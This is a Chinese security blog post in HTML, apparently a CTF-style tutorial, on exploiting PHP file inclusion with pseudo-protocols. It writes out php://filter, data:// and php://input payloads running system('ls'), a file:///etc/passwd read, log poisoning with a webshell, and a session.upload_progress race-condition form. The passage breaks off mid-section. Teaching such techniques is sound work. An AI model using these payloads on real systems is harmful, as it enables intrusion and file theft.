@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前言最近一直忙着考试和学校的各种实验，留的学安全的时间比较少，只能零碎时间来总结一下 之前护网杯的一道Web题涉及到了这一块，一直想抽时间总结了解一下，一直鸽到现在了。 废话不多说，这次主要是对文件包含 以及相关读写函数的一些利用总结，也对相关姿势进行一下梳理。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含+伪协议">
+<meta property="og:url" content="http://example.com/2020/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE/index.html">
+<meta property="og:site_name" content="My0n9s&#39;blog">
+<meta property="og:description" content="前言最近一直忙着考试和学校的各种实验，留的学安全的时间比较少，只能零碎时间来总结一下 之前护网杯的一道Web题涉及到了这一块，一直想抽时间总结了解一下，一直鸽到现在了。 废话不多说，这次主要是对文件包含 以及相关读写函数的一些利用总结，也对相关姿势进行一下梳理。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/12/01/giQoUTpsCf8nmKt.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/01/qUmjYXn1ItHBxWT.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/13/qtTWNwzGnIBmUZk.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/13/QCt9VcDSBmfPTIL.png">
+<meta property="og:image" content="https://i.loli.net/2020/11/30/O7R9PwE8FodH3Da.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/13/d9JYCryG4DwM87A.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/13/Tu1IaQlZRmMt5Ud.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/01/AlEW6mKBDIkzVxg.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/02/rXbgw1MVu6jyHKx.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/02/tUKJwqIxC61O7s4.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/02/kBcJiREuFwdAKS3.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/02/UTnmcHASvVEfZqg.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/03/Aqis5nurS2KY9kI.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/03/opFIQ86Nwlgsfzc.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/03/nm3TNrAQzf5bOEM.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/03/mKYV2hBXDQvZrgJ.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/04/HZ4ScB3Nv81otGu.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/04/P8xZ2qKNeO9Qwob.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/04/FZmGyCQb5MfnAvO.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/04/uWVSQyApnEH58hF.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/06/CYKxaU7HFZM2diz.png">
+<meta property="og:image" content="https://i.loli.net/2020/12/14/A8D5xlp3oUiqg47.png">
+<meta property="article:published_time" content="2020-11-30T00:38:46.000Z">
+<meta property="article:modified_time" content="2024-09-08T04:33:14.000Z">
+<meta property="article:author" content="My0n9s">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/12/01/giQoUTpsCf8nmKt.png">
+
+
+<link rel="canonical" href="http://example.com/2020/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2020/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE/","path":"2020/11/30/文件包含伪协议/","title":"文件包含+伪协议"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>文件包含+伪协议 | My0n9s'blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">My0n9s'blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">1.1.</span> <span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E6%B5%8B%E8%AF%95"><span class="nav-number">1.2.</span> <span class="nav-text">本地环境测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#include-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.3.</span> <span class="nav-text">include+伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#php-filter-read-%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%BA%90%E7%A0%81"><span class="nav-number">1.3.1.</span> <span class="nav-text">php:&#x2F;&#x2F;filter&#x2F;read 协议读源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.3.2.</span> <span class="nav-text">data协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#include-php-input"><span class="nav-number">1.3.3.</span> <span class="nav-text">include+php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#include-file%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.3.4.</span> <span class="nav-text">include+file协议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#include-%E5%8F%AF%E6%8E%A7%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.</span> <span class="nav-text">include+可控文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.1.</span> <span class="nav-text">包含日志文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8session-upload-progress"><span class="nav-number">1.4.2.</span> <span class="nav-text">利用session.upload_progress</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.4.3.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#file-get-contents-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.5.</span> <span class="nav-text">file_get_contents + 伪协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#file-put-content-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.6.</span> <span class="nav-text">file_put_content+伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2"><span class="nav-number">1.6.1.</span> <span class="nav-text">写在前面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#demo1"><span class="nav-number">1.6.2.</span> <span class="nav-text">demo1</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8base64"><span class="nav-number">1.6.2.1.</span> <span class="nav-text">利用base64</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8rot13"><span class="nav-number">1.6.2.2.</span> <span class="nav-text">利用rot13</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8string-strip-tags%E7%BB%93%E5%90%88-htaccess"><span class="nav-number">1.6.2.3.</span> <span class="nav-text">利用string.strip_tags结合.htaccess</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E7%BC%96%E7%A0%81%E7%BB%84%E5%90%88"><span class="nav-number">1.6.2.4.</span> <span class="nav-text">过滤器编码组合</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#demo2"><span class="nav-number">1.6.3.</span> <span class="nav-text">demo2</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8base64-1"><span class="nav-number">1.6.3.1.</span> <span class="nav-text">利用base64</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8rot13-1"><span class="nav-number">1.6.3.2.</span> <span class="nav-text">利用rot13</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8usc-2"><span class="nav-number">1.6.3.3.</span> <span class="nav-text">利用usc-2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8usc-4"><span class="nav-number">1.6.3.4.</span> <span class="nav-text">利用usc-4</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#utf-8%E3%80%81utf-7%E8%BD%AC%E6%8D%A2"><span class="nav-number">1.6.3.5.</span> <span class="nav-text">utf-8、utf-7转换</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#demo3"><span class="nav-number">1.6.4.</span> <span class="nav-text">demo3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">1.7.</span> <span class="nav-text">参考链接</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="My0n9s"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">My0n9s</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/30/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="My0n9s">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="文件包含+伪协议 | My0n9s'blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件包含+伪协议
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-11-30 08:38:46" itemprop="dateCreated datePublished" datetime="2020-11-30T08:38:46+08:00">2020-11-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2024-09-08 12:33:14" itemprop="dateModified" datetime="2024-09-08T12:33:14+08:00">2024-09-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近一直忙着考试和学校的各种实验，留的学安全的时间比较少，只能零碎时间来总结一下</p>
+<p>之前护网杯的一道Web题涉及到了这一块，一直想抽时间总结了解一下，一直鸽到现在了。</p>
+<p>废话不多说，这次主要是对文件包含 以及相关读写函数的一些利用总结，也对相关姿势进行一下梳理。</p>
+<span id="more"></span>
+
+<p>如果文档涉及到知识性的错误，欢迎与我来讨论</p>
+<p>联系方式 <code>512615513@qq.com</code></p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>你需要了解的：</p>
+<ul>
+<li><p>PHP相关函数</p>
+<ul>
+<li>include</li>
+<li>file_get_content</li>
+<li>file_put_content</li>
+<li>……等等</li>
+<li>附图：</li>
+</ul>
+<p><img src="https://i.loli.net/2020/12/01/giQoUTpsCf8nmKt.png" alt="BK_7E701ZG321YVC7J9MACP.png"></p>
+</li>
+<li><p>PHP伪协议</p>
+<ul>
+<li>php:&#x2F;&#x2F;filter</li>
+<li>data:&#x2F;&#x2F;</li>
+<li>file:&#x2F;&#x2F;</li>
+</ul>
+<p>​     等等</p>
+<p><code>https://www.freebuf.com/column/148886.html</code> 对伪协议的一个讲解文章。</p>
+<p>适用环境附图：</p>
+<p><img src="https://i.loli.net/2020/12/01/qUmjYXn1ItHBxWT.png" alt="123.png"></p>
+</li>
+</ul>
+<h2 id="本地环境测试"><a href="#本地环境测试" class="headerlink" title="本地环境测试"></a>本地环境测试</h2><p>在阿清出的一道反序列化的题目中，使用伪协议发现了问题，发现打不通，然后本地测试了一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="variable">$ceshi</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ceshi&#x27;</span>];</span><br><span class="line"> <span class="keyword">include</span>(<span class="variable">$ceshi</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>配合伪协议<code>php://filter</code>，payload为：<code>http://127.0.0.1/hello.php?ceshi=php://filter/read=convert.base64-encode/resource=flag.php</code> 可以读到base64编码后的flag</p>
+<p>如果换成 <code>$_post[&#39;ceshi&#39;]</code> 呢，答案是一样的。</p>
+<p>改一下源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ceshi</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ceshi&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$ceshi</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>同样我们配合 <code>php://filter</code> 伪协议，payload为：<code>http://127.0.0.1/hello.php?ceshi=php://filter/read=convert.base64-encode/resource=flag.php</code> 可以读到base64编码后的flag，换成POST传参形式亦然。</p>
+<p>然后我们再来尝试一下data协议 (这里测试的时候注意更改一下 php.ini 的配置，默认allow_url_include 是 off)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="variable">$ceshi</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ceshi&#x27;</span>];</span><br><span class="line"> <span class="keyword">include</span>(<span class="variable">$ceshi</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用data:&#x2F;&#x2F; 伪协议配合include函数可以执行包含文本内容：</p>
+<p><code>ceshi=data:text/plain,helloworld</code></p>
+<p><img src="https://i.loli.net/2020/12/13/qtTWNwzGnIBmUZk.png" alt="retry1.png"></p>
+<p>同样，我们利用data:&#x2F;&#x2F;伪协议配合include函数可以执行PHP语句:</p>
+<p><code>ceshi=data:text/plain,&lt;?php phpinfo();?&gt;</code></p>
+<p><img src="https://i.loli.net/2020/12/13/QCt9VcDSBmfPTIL.png" alt="retry2.png"></p>
+<p>如上图，这里本质上是使用data协议 包含了文本内容，文本内容为 <code>&lt;?php phpinfo();?&gt;</code> 然后被解析成PHP语句执行并返回结果。</p>
+<p>我们尝试一下<code>file_get_contents()</code>函数是不是也支持呢？测试一下：</p>
+<p><img src="https://i.loli.net/2020/11/30/O7R9PwE8FodH3Da.png" alt="J_C4AEA2CN4TNWJ040_O__P.png"></p>
+<p>然后我们尝试一下是不是也能支持PHP命令执行。</p>
+<p><img src="https://i.loli.net/2020/12/13/d9JYCryG4DwM87A.png" alt="retry3.png"></p>
+<p>显然，并不如我们想要的那样。</p>
+<p>为什么会出现这种原因，本质上还是在于对函数功能的理解，这两个函数 include和file_get_contents函数都是支持data伪协议的，这里的data协议用来获取文本数据，然后被include<strong>包含</strong>在当前php文件中，自然而然的就被解析成php代码，而file_get_contents函数只是获取文本的内容，而不是包含，所以没有被解析，从而造成代码执行。</p>
+<p>以上两个函数的本地测试只是想说明:</p>
+<ul>
+<li>存在一部分函数，它们是支持伪协议，并且配合伪协议可以达到一些意想不到的效果。</li>
+<li>同样是支持伪协议，但是不同函数的功能配合伪协议产生的效果也会很不一样。</li>
+</ul>
+<p>接下来对一些函数配合伪协议达到的妙用进行一个小结。</p>
+<h2 id="include-伪协议"><a href="#include-伪协议" class="headerlink" title="include+伪协议"></a>include+伪协议</h2><h3 id="php-filter-read-协议读源码"><a href="#php-filter-read-协议读源码" class="headerlink" title="php:&#x2F;&#x2F;filter&#x2F;read 协议读源码"></a>php:&#x2F;&#x2F;filter&#x2F;read 协议读源码</h3><p>姿势：</p>
+<p><code>ceshi=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
+<p><code>ceshi=php://filter/read=convert.iconv.utf-8.utf-16/resource=flag.php</code></p>
+<p>这里的读取出来的编码可以有多种方式（后面看了利用编码写操作就发现多么骚了。），<code>base64、utf-8、utf-16</code>等等，有时候会被过滤，换着绕，另外本地测试发现用这个协议的时候，除了convert那里不能动，其他都可以换成大写小写混着，用这个trick可以绕过一些过滤。</p>
+<h3 id="data协议"><a href="#data协议" class="headerlink" title="data协议"></a>data协议</h3><p>可以利用data协议来执行PHP语句:</p>
+<p>姿势：</p>
+<p><code>data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code> 这里加不加 &#x2F;&#x2F;都可。</p>
+<p>利用base64编码来绕过</p>
+<p><code>data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+</code>  等效于执行 system(‘ls’);</p>
+<p>本地测试发现，除了data不能动，其他都可以混用大小写来达到绕过的目的。</p>
+<h3 id="include-php-input"><a href="#include-php-input" class="headerlink" title="include+php:&#x2F;&#x2F;input"></a>include+php:&#x2F;&#x2F;input</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> <span class="variable">$ceshi</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ceshi&#x27;</span>];</span><br><span class="line"> <span class="keyword">include</span>(<span class="variable">$ceshi</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>仍然是这个代码，我们可以利用php:&#x2F;&#x2F;input 协议，利用如下：</p>
+<p><code>?ceshi=php://input</code>  然后 post 直接传数据  : <code>&lt;?php system(&#39;ls&#39;);</code> ，这里POST数据可控。</p>
+<p>不过这里有要求，当编码格式为 <code>enctype=&quot;multipart/form-data&quot;</code>  php:&#x2F;&#x2F;input是无效的。</p>
+<p>关于编码格式的解释，贴上一篇博客。</p>
+<p><code>https://blog.csdn.net/lingxiyizhi_ljx/article/details/102514560</code></p>
+<h3 id="include-file协议"><a href="#include-file协议" class="headerlink" title="include+file协议"></a>include+file协议</h3><p>我们这里可以直接用file协议读取本地文件系统的文件，需要使用绝对路径。</p>
+<p><code>?ceshi=file:///etc/passwd</code> ，这里前提是文件可访问。</p>
+<p><strong>大小写这个似乎对PHP的版本有要求，不同的版本有的可以，有的不行。</strong></p>
+<h2 id="include-可控文件"><a href="#include-可控文件" class="headerlink" title="include+可控文件"></a>include+可控文件</h2><p>文件包含的本质是包含一些危险代码，或者是webshell，如果一个文件的内容可控，我们包含之，就可以getshell</p>
+<h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>我们在UA头那里包含我们的一句话木马，然后包含日志文件，以nginx为例，日志路径为 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log ，apache服务器下日志路径稍微有所不同(&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log)</p>
+<p><img src="https://i.loli.net/2020/12/13/Tu1IaQlZRmMt5Ud.png" alt="retry4.png"></p>
+<p> 传过去，然后蚁剑连接，连接路径为 :  <code>https://127.0.0.1/ceshi.php?file=/var/log/nginx/access.log</code></p>
+<h3 id="利用session-upload-progress"><a href="#利用session-upload-progress" class="headerlink" title="利用session.upload_progress"></a>利用session.upload_progress</h3><p>这个思路听说早就有了，但是上上周才接触到，还是学的太少了。</p>
+<p>有一篇文章对 <code>session.upload_progress</code>讲的挺好，这里贴上链接：<code>https://www.freebuf.com/news/202819.html)</code></p>
+<p>简单来说就是上传一个 PHP_SESSION_UPLOAD_PROGRESS 文件，文件内容可以写上我们的shell。然后包含 &#x2F;tmp&#x2F;sess_xxx，这里xxx是可控的。然后在利用条件竞争（因为会被删除掉），这里可以直接抓包，利用 intruder模块来进行条件竞争。</p>
+<p>附上一个师傅的上传脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#poc.php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;ip&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;2333&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>抓包图：(用的师傅的一张。</p>
+<p><img src="https://i.loli.net/2020/12/01/AlEW6mKBDIkzVxg.png" alt="W13K__CM_MV_5V8F_29_VX8.png"></p>
+<p>有时候打不出来，可能是条件竞争没有成功，还没包含就被删掉了，可以考虑线程开大一点。</p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>include + 伪协议来 getshell ，不局限于这两个文件，只要：</p>
+<ul>
+<li>文件内容可控</li>
+<li>文件可以被访问（也就是可以被包含）</li>
+</ul>
+<p>就可以成功getshell。</p>
+<h2 id="file-get-contents-伪协议"><a href="#file-get-contents-伪协议" class="headerlink" title="file_get_contents + 伪协议"></a>file_get_contents + 伪协议</h2><p>前面的那个本地测试的demo，对 php:&#x2F;&#x2F;filter和data:&#x2F;&#x2F;text 做了说明，其实 file_get_contents还可以结合 php:&#x2F;&#x2F;input</p>
+<p>demo:</p>
